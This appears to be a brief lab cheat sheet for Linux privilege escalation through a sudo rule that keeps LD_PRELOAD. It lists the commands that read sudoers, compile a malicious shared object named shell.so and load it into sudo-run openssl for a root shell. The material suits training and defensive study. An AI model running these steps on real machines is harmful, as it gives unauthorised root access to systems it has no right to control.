- [ ] Enumeration
- [ ] Exploitation

Enumeration!!!
```sh
# /etc/sudoers
cat /etc/sudoers
Defaults env_keep += LD_PRELOAD
# sudo
sudo -l
env_keep += LD_PRELOAD
```
Exploitation!!!
```sh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles 
ls -al shell.so
sudo LD_PRELOAD=/home/htb-student/shell.so /usr/bin/openssl
```
References!!!
```
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
```